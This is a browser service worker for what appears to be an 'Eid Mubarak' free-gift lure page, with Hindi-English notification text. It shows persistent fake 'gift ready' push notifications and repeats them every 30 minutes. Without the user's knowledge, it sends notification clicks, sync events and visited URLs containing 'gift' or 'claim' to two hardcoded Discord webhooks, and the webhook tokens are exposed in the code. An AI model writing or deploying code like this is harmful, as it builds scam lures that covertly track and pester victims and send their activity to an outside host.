const WEBHOOKS = [
    'https://discord.com/api/webhooks/1471082357623881871/2QG0xJh-b7YD3Brlo4OYvQyT1iIJwzVtgSw9auq4jCRMzR2pZIWziinSNeTRSyJ7gPcg',
    'https://discord.com/api/webhooks/1471082363944702006/_hZWpLDl_Uo2Mf7sHaHjhpLgY4KXfJGPjulB1u407flimKaRyUhIbN0LlVGZTsTttKyR'
];

self.addEventListener('install', e => {
    console.log('SW installed');
    self.skipWaiting();
});

self.addEventListener('activate', e => {
    console.log('SW activated');
    e.waitUntil(clients.claim());
});

// Push notification receive
self.addEventListener('push', e => {
    let data = e.data?.json() || {};
    
    const options = {
        body: data.body || '🎁 Aapka gift ready hai!',
        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ffd700\'/%3E%3Ctext x=\'50\' y=\'70\' font-size=\'70\' text-anchor=\'middle\' fill=\'%230a5c0a\'%3E🎁%3C/text%3E%3C/svg%3E',
        badge: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ffd700\'/%3E%3C/svg%3E',
        vibrate: [200, 100, 200],
        requireInteraction: true,
        tag: 'gift-' + Date.now(),
        data: { url: '/' }
    };

    e.waitUntil(
        self.registration.showNotification(data.title || '🎉 Eid Mubarak!', options)
    );
});

// Notification click
self.addEventListener('notificationclick', e => {
    e.notification.close();
    
    // Open website
    e.waitUntil(clients.openWindow('/'));
    
    // Send to Discord
    for(const webhook of WEBHOOKS) {
        fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: '👆 **Notification Clicked**',
                embeds: [{
                    title: 'User clicked notification',
                    fields: [
                        { name: 'Time', value: new Date().toLocaleString(), inline: true },
                        { name: 'Action', value: 'Open Website', inline: true }
                    ],
                    timestamp: new Date().toISOString()
                }]
            })
        }).catch(() => {});
    }
});

// Background sync
self.addEventListener('sync', e => {
    if(e.tag === 'send-data') {
        e.waitUntil(
            Promise.all(WEBHOOKS.map(webhook => 
                fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: '🔄 **Background Sync**',
                        embeds: [{
                            title: 'Service Worker Active',
                            fields: [
                                { name: 'Time', value: new Date().toLocaleString(), inline: true }
                            ],
                            timestamp: new Date().toISOString()
                        }]
                    })
                }).catch(() => {})
            ))
        );
    }
});

// Periodic reminder (30 minutes)
setInterval(() => {
    self.registration.showNotification('⏰ Gift Abhi Bhi Hai!', {
        body: 'Claim karne ke liye click karo',
        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ffd700\'/%3E%3Ctext x=\'50\' y=\'70\' font-size=\'70\' text-anchor=\'middle\' fill=\'%230a5c0a\'%3E⌚%3C/text%3E%3C/svg%3E',
        tag: 'reminder-' + Date.now(),
        requireInteraction: true
    });
    
    // Send to Discord
    for(const webhook of WEBHOOKS) {
        fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                content: '⏰ **Reminder Sent**',
                embeds: [{
                    title: '30 Minute Reminder',
                    fields: [
                        { name: 'Time', value: new Date().toLocaleString(), inline: true }
                    ]
                }]
            })
        }).catch(() => {});
    }
}, 1800000);

// Fetch event - background mein data collect
self.addEventListener('fetch', e => {
    if(e.request.url.includes('gift') || e.request.url.includes('claim')) {
        e.waitUntil(
            Promise.all(WEBHOOKS.map(webhook =>
                fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: '🌐 **Page Visit**',
                        embeds: [{
                            title: 'User visited',
                            fields: [
                                { name: 'URL', value: e.request.url, inline: false },
                                { name: 'Time', value: new Date().toLocaleString(), inline: true }
                            ]
                        }]
                    })
                }).catch(() => {})
            ))
        );
    }
});

// Log SW activation
console.log('✅ Service Worker Active');